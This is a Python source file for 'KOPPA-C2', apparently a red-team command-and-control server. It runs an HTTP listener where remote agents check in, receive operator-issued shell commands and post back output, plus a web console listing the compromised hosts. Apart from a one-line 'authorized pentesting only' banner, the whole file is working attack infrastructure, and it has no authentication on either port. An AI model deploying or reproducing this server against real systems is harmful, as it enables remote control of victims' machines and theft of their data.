#!/usr/bin/env python3
"""
KOPPA-C2 Server — HTTP/DNS C2 framework with Web Console
Usage: koppa-c2 [host] [port] [--webui-port PORT]
"""
import sys, os, json, time, uuid, threading, hashlib, base64, re
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# ── State ─────────────────────────────────────────────────────────────────────
AGENTS   = {}   # {agent_id: {ip, os, hostname, checkin, tasks, results}}
TASKS    = {}   # {task_id: {agent_id, cmd, status, result, ts}}
LOCK     = threading.Lock()

R="\033[91m"; G="\033[92m"; C="\033[96m"; Y="\033[93m"; D="\033[2m"; E="\033[0m"; B="\033[1m"

def ts(): return time.strftime("%H:%M:%S")
def log(msg, lvl="*"): print(f"{D}[{ts()}]{E} {C}[{lvl}]{E} {msg}")

# ── C2 HTTP handler ───────────────────────────────────────────────────────────
class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass  # suppress default access log

    def _json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(body))
        self.end_headers(); self.wfile.write(body)

    def _text(self, text, code=200):
        body = text.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", len(body))
        self.end_headers(); self.wfile.write(body)

    def _read_body(self):
        l = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(l).decode(errors="replace") if l else ""

    def do_GET(self):
        p = urlparse(self.path)
        path, qs = p.path, parse_qs(p.query)

        # Agent check-in / task poll
        if path.startswith("/beacon/"):
            aid = path.split("/")[2]
            with LOCK:
                if aid not in AGENTS:
                    AGENTS[aid] = {"ip": self.client_address[0], "os": "unknown",
                                   "hostname": aid[:8], "checkin": ts(),
                                   "last_seen": time.time(), "tasks": [], "results": []}
                    log(f"New agent: {G}{aid}{E} from {self.client_address[0]}", "+")
                AGENTS[aid]["last_seen"] = time.time()
                # Return pending task
                pending = [tid for tid in AGENTS[aid]["tasks"]
                           if TASKS.get(tid, {}).get("status") == "pending"]
                if pending:
                    tid = pending[0]
                    TASKS[tid]["status"] = "sent"
                    self._text(json.dumps({"task_id": tid, "cmd": TASKS[tid]["cmd"]}))
                    return
            self._text("{}"); return

        # Web console API
        if path == "/api/agents":
            with LOCK:
                data = {}
                for aid, a in AGENTS.items():
                    data[aid] = {**a, "online": (time.time() - a["last_seen"]) < 30}
            self._json(data); return

        if path == "/api/tasks":
            with LOCK: self._json(TASKS); return

        if path.startswith("/api/results/"):
            aid = path.split("/")[3]
            with LOCK:
                results = AGENTS.get(aid, {}).get("results", [])
            self._json(results); return

        # Web console UI
        if path in ("/", "/console"):
            self._serve_console(); return

        self.send_response(404); self.end_headers()

    def do_POST(self):
        p = urlparse(self.path); path = p.path
        body = self._read_body()

        # Agent registers info
        if path.startswith("/register/"):
            aid = path.split("/")[2]
            try: info = json.loads(body)
            except: info = {}
            with LOCK:
                if aid in AGENTS:
                    AGENTS[aid].update(info)
            self._json({"ok": True}); return

        # Agent submits result
        if path.startswith("/result/"):
            parts = path.split("/")
            aid, tid = parts[2], parts[3] if len(parts) > 3 else ""
            with LOCK:
                result = {"task_id": tid, "output": body, "ts": ts()}
                if aid in AGENTS:
                    AGENTS[aid]["results"].append(result)
                if tid in TASKS:
                    TASKS[tid]["status"] = "done"
                    TASKS[tid]["result"] = body
            log(f"Result from {Y}{aid[:8]}{E}: {body[:60]}", "=")
            self._json({"ok": True}); return

        # Operator sends task via web console
        if path == "/api/task":
            try: req = json.loads(body)
            except: self._json({"error": "bad json"}, 400); return
            aid = req.get("agent_id"); cmd = req.get("cmd", "")
            if not aid or aid not in AGENTS:
                self._json({"error": "agent not found"}, 404); return
            tid = str(uuid.uuid4())[:8]
            with LOCK:
                TASKS[tid] = {"agent_id": aid, "cmd": cmd,
                              "status": "pending", "result": "", "ts": ts()}
                AGENTS[aid]["tasks"].append(tid)
            log(f"Task {C}{tid}{E} → {Y}{aid[:8]}{E}: {cmd}")
            self._json({"task_id": tid}); return

        self.send_response(404); self.end_headers()

    def _serve_console(self):
        html = CONSOLE_HTML
        body = html.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", len(body))
        self.end_headers(); self.wfile.write(body)


# ── Web Console HTML ──────────────────────────────────────────────────────────
CONSOLE_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<title>KOPPA-C2 Console</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0000;color:#e0d0d0;font-family:'Courier New',monospace;font-size:13px}
header{background:rgba(5,0,0,.9);border-bottom:1px solid #3a0000;padding:12px 24px;
  display:flex;align-items:center;gap:16px}
header h1{font-size:16px;letter-spacing:4px;color:#fff}
header h1 span{color:#cc1111}
.dot{width:8px;height:8px;border-radius:50%;background:#33cc55;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
main{display:grid;grid-template-columns:280px 1fr;height:calc(100vh - 49px)}
aside{background:rgba(5,0,0,.7);border-right:1px solid #3a0000;overflow-y:auto}
aside h2{font-size:10px;letter-spacing:4px;color:#cc1111;padding:16px;border-bottom:1px solid #3a0000}
.agent{padding:12px 16px;border-bottom:1px solid #1a0000;cursor:pointer;transition:.15s}
.agent:hover,.agent.active{background:rgba(180,0,0,.1)}
.agent-id{font-size:12px;color:#fff;letter-spacing:1px}
.agent-meta{font-size:10px;color:#7a4040;margin-top:3px}
.online{color:#33cc55}.offline{color:#555}
.badge{font-size:9px;background:#cc1111;color:#fff;padding:1px 5px;border-radius:2px;margin-left:6px}
section{display:flex;flex-direction:column}
.panel{padding:16px;border-bottom:1px solid #1a0000}
.panel h3{font-size:10px;letter-spacing:3px;color:#cc1111;margin-bottom:10px}
#results{flex:1;overflow-y:auto;padding:16px;background:#000}
.result-entry{margin-bottom:16px;border-left:2px solid #3a0000;padding-left:12px}
.result-ts{font-size:10px;color:#555;margin-bottom:4px}
.result-cmd{color:#cc1111;margin-bottom:4px}
.result-out{color:#aaffaa;white-space:pre-wrap;font-size:12px}
.cmd-bar{display:flex;gap:8px;padding:12px 16px;background:rgba(5,0,0,.9);border-top:1px solid #3a0000}
#cmd-input{flex:1;background:#0d0000;border:1px solid #3a0000;color:#e0d0d0;
  padding:8px 12px;font-family:'Courier New',monospace;font-size:13px}
#cmd-input:focus{outline:none;border-color:#cc1111}
button{background:#8b0000;color:#fff;border:none;padding:8px 20px;
  font-family:'Courier New',monospace;cursor:pointer;letter-spacing:2px;font-size:11px}
button:hover{background:#cc1111}
#no-agent{padding:40px;color:#555;text-align:center}
</style>
</head>
<body>
<header>
  <div class="dot"></div>
  <h1>KOPPA<span>-C2</span> Console</h1>
  <span id="agent-count" style="font-size:11px;color:#7a4040">Loading...</span>
</header>
<main>
  <aside>
    <h2>AGENTS</h2>
    <div id="agent-list"></div>
  </aside>
  <section>
    <div id="no-agent">Select an agent to interact</div>
    <div id="console-panel" style="display:none;flex:1;display:none;flex-direction:column">
      <div class="panel">
        <h3>AGENT INFO</h3>
        <div id="agent-info" style="font-size:11px;color:#7a4040;line-height:1.8"></div>
      </div>
      <div id="results"></div>
      <div class="cmd-bar">
        <input id="cmd-input" placeholder="Enter command..." autofocus/>
        <button onclick="sendCmd()">EXEC</button>
      </div>
    </div>
  </section>
</main>
<script>
let selectedAgent = null;
let knownResults = {};

async function loadAgents() {
  const r = await fetch('/api/agents').then(r=>r.json()).catch(()=>({}));
  const list = document.getElementById('agent-list');
  const count = Object.keys(r).length;
  document.getElementById('agent-count').textContent = count + ' agent(s)';
  list.innerHTML = '';
  for (const [id, a] of Object.entries(r)) {
    const online = a.online;
    const div = document.createElement('div');
    div.className = 'agent' + (id===selectedAgent?' active':'');
    div.innerHTML = `<div class="agent-id">
      <span class="${online?'online':'offline'}">${online?'●':'○'}</span>
      ${id.substring(0,12)}
      ${a.results.length?'<span class="badge">'+a.results.length+'</span>':''}
    </div>
    <div class="agent-meta">${a.ip} · ${a.os} · ${a.checkin}</div>`;
    div.onclick = () => selectAgent(id, a);
    list.appendChild(div);
  }
}

function selectAgent(id, info) {
  selectedAgent = id;
  document.getElementById('no-agent').style.display = 'none';
  const panel = document.getElementById('console-panel');
  panel.style.display = 'flex';
  document.getElementById('agent-info').innerHTML =
    `ID: ${id}<br>IP: ${info.ip}<br>OS: ${info.os}<br>Host: ${info.hostname}<br>Check-in: ${info.checkin}`;
  loadResults();
}

async function loadResults() {
  if (!selectedAgent) return;
  const r = await fetch('/api/results/'+selectedAgent).then(r=>r.json()).catch(()=>[]);
  const div = document.getElementById('results');
  div.innerHTML = '';
  for (const entry of r) {
    const el = document.createElement('div');
    el.className = 'result-entry';
    el.innerHTML = `<div class="result-ts">[${entry.ts}] task:${entry.task_id}</div>
    <div class="result-out">${escHtml(entry.output)}</div>`;
    div.appendChild(el);
  }
  div.scrollTop = div.scrollHeight;
}

async function sendCmd() {
  const input = document.getElementById('cmd-input');
  const cmd = input.value.trim();
  if (!cmd || !selectedAgent) return;
  input.value = '';
  await fetch('/api/task', {method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({agent_id: selectedAgent, cmd: cmd})});
}

document.getElementById('cmd-input').addEventListener('keydown', e => {
  if (e.key==='Enter') sendCmd();
});

function escHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

setInterval(loadAgents, 3000);
setInterval(()=>{ if(selectedAgent) loadResults(); }, 2000);
loadAgents();
</script>
</body>
</html>"""


# ── Main ──────────────────────────────────────────────────────────────────────
def start_c2(host="0.0.0.0", port=8443, webui_port=8444):
    c2_srv   = HTTPServer((host, port), C2Handler)
    webui_srv = HTTPServer((host, webui_port), C2Handler)

    print(f"\n{B}KOPPA-C2{E}  v3.0\n")
    print(f"  {G}[+]{E} C2 listener  : http://{host}:{port}")
    print(f"  {G}[+]{E} Web console  : http://127.0.0.1:{webui_port}/console")
    print(f"  {Y}[!]{E} For authorized pentesting only\n")

    threading.Thread(target=webui_srv.serve_forever, daemon=True).start()
    try:
        c2_srv.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Y}[!]{E} Shutting down...")


if __name__ == "__main__":
    args = sys.argv[1:]
    host = args[0] if len(args) > 0 else "0.0.0.0"
    port = int(args[1]) if len(args) > 1 else 8443
    webui = int(args[2]) if len(args) > 2 else 8444
    start_c2(host, port, webui)
